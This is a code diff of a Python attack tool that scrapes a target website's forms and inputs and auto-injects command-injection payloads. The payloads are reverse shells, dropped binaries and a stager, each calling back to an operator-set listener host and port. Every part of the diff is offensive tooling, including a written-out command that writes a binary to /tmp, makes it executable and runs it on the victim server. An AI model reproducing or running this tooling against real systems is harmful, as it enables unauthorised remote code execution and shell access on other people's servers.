@@ -11,6 +11,8 @@ import string
 import time
 import threading
 import readline
+import sys
+import requests
 
 parser = argparse.ArgumentParser(description='Test')
 
@@ -24,54 +26,13 @@ def comma_separated(names):
     return names.split(',')
 
 
+INJECT_SUCCESS = False
+
 PAYLOAD_TYPES = ['shell', 'binshell', 'stager', 'custom']
 
+STAGE_TYPES = ['bin', 'cmd']
+
 STAGER_CONTROL_PORT = random.randint(12000, 20000)  # should this be an arg?
-
-parser.add_argument('target_url', help='Target URL')
-parser.add_argument('-lhost', '--lhost', help='Server ip the payload connects to', default='127.0.0.1')
-parser.add_argument('-lport', '--lport', help="Port the payload connects to", default=random.randint(12000, 20000))
-parser.add_argument('-ptype', '--ptype', help=f"Port of the server the payload connects to: {', '.join(PAYLOAD_TYPES)}", default='shell')
-parser.add_argument('-payload', '--payload', help="if ptype is custom, provide your own string to inject", default=None)
-parser.add_argument('-names', type=comma_separated, help="Comma-separated list of names to inject (website input points of your choosing)", default=[])
-parser.add_argument('-v', '--verbose', action='store_true', help='Increase output verbosity')
-
-args = parser.parse_args()
-
-print(f"target_url: {args.target_url}")
-
-if args.verbose:
-    pass
-    # TODO
-
-if not args.target_url:
-    print("Target URL required")
-    exit(1)
-
-if args.ptype not in PAYLOAD_TYPES:
-    print("\n")
-    print(f"-ptype should be one of [{', '.join(PAYLOAD_TYPES)}]")
-    exit(1)
-
-if args.ptype == 'custom' and not args.payload:
-    print("\n")
-    print("-ptype is set to custom but no payload is provided")
-    exit(1)
-
-if "http" not in args.target_url:
-    print("\n")
-    print("No protocol specified")
-    exit(1)
-
-if not args.lhost:
-    print("\n")
-    print("No -lhost specified")
-    exit(1)
-
-LHOST = args.lhost
-LPORT = args.lport
-
-inject_success = False
 
 
 def on_recv(data):
@@ -79,129 +40,251 @@ def on_recv(data):
 
 
 def on_shell(addr):
-    global inject_success
-    inject_success = True
+    global INJECT_SUCCESS
+    INJECT_SUCCESS = True
 
+
+CUSTOM_NAMES = []
+
+LISTENER = None
+
+CONTROL_TOWER = None
+
+URL = None
+
+LHOST = None
+
+LPORT = None
+
+CHOST = None
+
+CPORT = None
+
+PL = None
+
+PTYPE = None
+
+TARGET = None
+
+MONKEY = None
+
+GENERATOR = None
+
+CUSTOM_PAYLOAD = None
+
+CUSTOM_LISTENER = None
+
+CUSTOM_STAGE_TYPES = []
+
+CUSTOM_STAGES = []
+
+
+def ON_STAGER_CONNECT(ct):
+    global INJECT_SUCCESS
+    INJECT_SUCCESS = True
+
+    # TODO
+
+
+def scrape():
+    global MONKEY
+
+    if 'http' not in URL:
+        print('scrape called but argument is not a valid url (missing http://?)')
+        quit()
+
+    MONKEY = Monkey(URL)
+
+    forms = MONKEY.get_forms()
+    inputs = MONKEY.get_inputs()
+    if forms is None and inputs is None:
+        print("Scrape failed. Nowhere to inject")
+        exit(1)
+    else:
+        print('FORMS', not not forms)
+        print('INPUTS', not not inputs)
+
+
+def monkey_inject():
+    global MONKEY
+
+    if not MONKEY and not not URL and not TARGET:
+        print('URL present, TARGET isn\'t. Implicitly calling scrape()')
+        scrape()
+
+    if MONKEY.get_forms():
+        print("Injecting via forms")
+        MONKEY.autoinject_forms(PL)
+
+    if MONKEY.get_inputs() and not INJECT_SUCCESS:
+        print("Injecting with names found in inputs")
+        MONKEY.autoinject_urls(PL)
+
+    if MONKEY.get_inputs() and not INJECT_SUCCESS and (len(CUSTOM_NAMES) > 0):
+        print("Injecting via endpoints with custom names")
+        MONKEY.autoinject_urls(PL)
+
+
+def check_LHOST_LPORT():
+    global LHOST, LPORT
+    if not LHOST:
+        default = '127.0.0.1'
+        LHOST = default
+        print(f'listen() called but no LHOST specified. Using {default}')
+    if not LPORT:
+        default = random.randint(12000, 20000)
+        LPORT = default
+        print(f'listen() called but no LPORT specified. Using {default}')
+
+
+def check_CHOST_CPORT():
+    global CHOST, CPORT
+    if not CHOST:
+        default = '127.0.0.1'
+        CHOST = default
+        print(f'control() called but no CHOST specified. Using {default}')
+    if not CPORT:
+        CPORT = STAGER_CONTROL_PORT
+        print(f'control() called but no CPORT specified. Using {STAGER_CONTROL_PORT}')
+
+
+def start_control_tower():
+    CONTROL_TOWER = ControlTower(ip=CHOST, port=int(STAGER_CONTROL_PORT), success_cb=ON_STAGER_CONNECT)
+
+    CONTROL_TOWER.start()
 
 try:
-    monkey = Monkey(args.target_url)
+    # TODO: custom help message
+    for i in range(len(sys.argv)):  # collect args
+        arg = sys.argv[i]
 
-    generator = Generator(lhost=LHOST, lport=LPORT)
+        if arg == 'LHOST':
+            LHOST = sys.argv[i + 1]
 
-    def try_inject(pl):
-        if monkey.get_forms():
-            print("Injecting via forms")
-            monkey.autoinject_forms(pl)
+        if arg == 'LPORT':
+            LPORT = sys.argv[i + 1]
 
-        if monkey.get_inputs() and not inject_success:
-            print("Injecting with names found in inputs")
-            monkey.autoinject_urls(pl)
+        if arg == 'CHOST':
+            CHOST = sys.argv[i + 1]
 
-        if monkey.get_inputs() and not inject_success and (len(args.names) > 0):
-            print("Injecting via endpoints with custom names")
-            shell = generator.ir_shell()
-            monkey.autoinject_urls(shell)
+        if arg == 'CPORT':
+            CPORT = sys.argv[i + 1]
 
-    if monkey.get_forms() is None and monkey.get_inputs() is None:
-        print("Nowhere to inject")
-        exit(1)
+        if arg == 'PTYPE':
+            PTYPE = sys.argv[i + 1]
 
-    if args.ptype == 'shell':
-        listener = ReverseListener(
-            ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)
+        if arg == 'URL':
+            URL = sys.argv[i + 1]
 
-        listener.start()
+        if arg == 'TARGET':
+            TARGET = sys.argv[i + 1]
 
-        pl = generator.ir_shell()
+        if arg == 'CUSTOM_PAYLOAD':
+            CUSTOM_PAYLOAD = sys.argv[i + 1]
 
-        try_inject(pl)
+        if arg == 'CUSTOM_LISTENER':
+            CUSTOM_LISTENER = sys.argv[i + 1]
 
-    elif args.ptype == 'binshell':
-        listener = ReverseListener(
-            ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)
+        if arg == 'CUSTOM_NAMES':
+            CUSTOM_NAMES = comma_separated(sys.argv[i + 1])
 
-        listener.start()
+        if arg == 'CUSTOM_STAGES':
+            CUSTOM_STAGES = comma_separated(sys.argv[i + 1])
 
-        pl_bin = generator.ir_bin()
-        n = randword(4)
-        pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
+        if arg == 'CUSTOM_STAGE_TYPE':
+            CUSTOM_STAGE_TYPES = comma_separated(sys.argv[i + 1])
 
-        try_inject(pl)
+    for i in range(len(sys.argv)):  # collect commands
+        arg = sys.argv[i]
 
-    elif args.ptype == 'stager':
-        pl_bin = Generator.bin_stager(lhost=LHOST, lport=STAGER_CONTROL_PORT)
-        n = randword(4)
-        pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
+        if arg == 'generate':
+            if PTYPE not in PAYLOAD_TYPES:
+                print(f"generate called but argument is not one of [{', '.join(PAYLOAD_TYPES)}]")
+                quit()
 
-        def shell_cli():  # TODO (is this even needed?) (probably going to dumpster)
-            stager_commands = {
-                'inject': 'Injects a specified payload. Args: PAYLOAD_NAME',
-            }
+            check_LHOST_LPORT()
 
-            stager_payloads = {
-                'lshell': f'Inject a reverse shell and start a listener. Args: SHELL_TYPE {PAYLOAD_TYPES}, LHOST, LPORT',
-                'shell': f'Inject a reverse shell. Args: SHELL_TYPE {PAYLOAD_TYPES}',
-                'custom': f'Inject a reverse shell. Args: SHELL_TYPE {PAYLOAD_TYPES}',
-            }
+            GENERATOR = Generator(LHOST, LPORT)
 
-            print('Stager injected, what to do? (>help)')
-            while True:
-                try:
-                    cmd = input('>')
+            match PTYPE:
+                case 'shell':
+                    PL = GENERATOR.ir_shell()
+                case 'binshell':
+                    PL = GENERATOR.ir_bin()
+                case 'stager':
+                    check_CHOST_CPORT()
+                    PL = Generator.bin_stager(CHOST, CPORT)
+                case 'custom':
+                    PL = CUSTOM_PAYLOAD
 
-                    if cmd != 'help' and cmd not in stager_payloads:
-                        print('Unknown command, type help')
+            print(PL)
 
-                    if cmd == 'help':
-                        print('Shell syntax: STAGER_CMD CMD_ARGS OPT_ARGS')
-                        print('Example: inject   lshell      binshell      127.0.0.1  1337')
-                        print('           ^        ^            ^             ^        ^')
-                        print('     STAGER_CMD PYALOAD_TYPE   SHELL_TYPE    LHOST    LPORT')
-                        print('')
-                        print('--> Stager commands:')
-                        print('')
-                        for key,val in stager_commands.items():
-                            print(key + ':', val)
-                        print('')
-                        print('--> Payloads stager can inject:')
-                        print('')
-                        for key,val in stager_payloads.items():
-                            print(key + ':', val)
-                        print('')
+        if arg == 'scrape':
+            scrape()
 
-                except EOFError:  # ctrl-d
-                    ct.stop()
+        if arg == 'listen':
+            check_LHOST_LPORT()
+
+            LISTENER = ReverseListener(
+                ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)
+
+            LISTENER.start()
+
+        if arg == 'inject':
+            if not PTYPE:
+                PTYPE = 'binshell'
+
+            if PTYPE not in PAYLOAD_TYPES:
+                print(f"inject called but argument is not one of [{', '.join(PAYLOAD_TYPES)}]")
+                quit()
+
+            if not CUSTOM_LISTENER and not LISTENER:
+                check_LHOST_LPORT()
+
+                LISTENER = ReverseListener(
+                    ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)
+
+                LISTENER.start()
+
+            if PTYPE == 'stager':
+                if len(CUSTOM_STAGES) > 0 and not CUSTOM_STAGE_TYPES:
+                    print('To use custom stages, specify custom stage types:')
+                    print(f'Supported types: {STAGE_TYPES}')
+                    print('To inject a binary, element of CUSTOM_STAGES should be filepath to the binary and element of CUSTOM_STAGE_TYPES should be bin')
+                    print('To inject a command, element of CUSTOM_STAGES should be the command and element of CUSTOM_STAGE_TYPES should be cmd')
                     quit()
 
-                time.sleep(0.05)
+                n = randword(4)
+                PL = f'printf "{PL}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
 
-        def on_connect(ct):
-            global inject_success
-            inject_success = True
+                if not CONTROL_TOWER:
+                    check_CHOST_CPORT()
+                    start_control_tower()
 
-            shell_cli()
+            elif PTYPE == 'binshell':
+                n = randword(4)
+                PL = Generator.bin_reverse_shell(LHOST, LPORT)
+                PL = f'printf "{PL}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
 
-        ct = ControlTower(ip=LHOST, port=int(STAGER_CONTROL_PORT), success_cb=on_connect)
+            if not PL:
+                default = 'binshell'
+                PL = Generator.bin_reverse_shell(LHOST, LPORT)
+                print(f'No payload type (PTYPE) scpecified, using {default}')
+                PL = f'printf "{PL}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
 
-        ct.start()
+            if URL:  # scrape was called
+                if TARGET and 'INJECT' in TARGET:
+                    print('scrape and inject target cannot be called together. Choose one')
+                    quit()
+                monkey_inject()
+            elif TARGET and 'INJECT' in TARGET:
+                target = TARGET.replace('INJECT', PL)
+                # TODO get request type (http, socket, etc) from args and make it here or in imported func
 
-        try_inject(pl)
-
-    elif args.ptype == 'custom':
-        listener = ReverseListener(
-            ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)
-
-        listener.start()
-
-        pl = args.payload
-
-        try_inject(pl)
-
-    if not inject_success and args.ptype != 'stager':
-        print("\n")
-        if not args.payload:  # if we don't care about output
-            print("Failed :(")
-            print("Try a different payload type")
+        if arg == 'control':
+            if not CONTROL_TOWER:
+                check_CHOST_CPORT()
+                start_control_tower()
 
 except KeyboardInterrupt:  # ctrl-c
     quit()
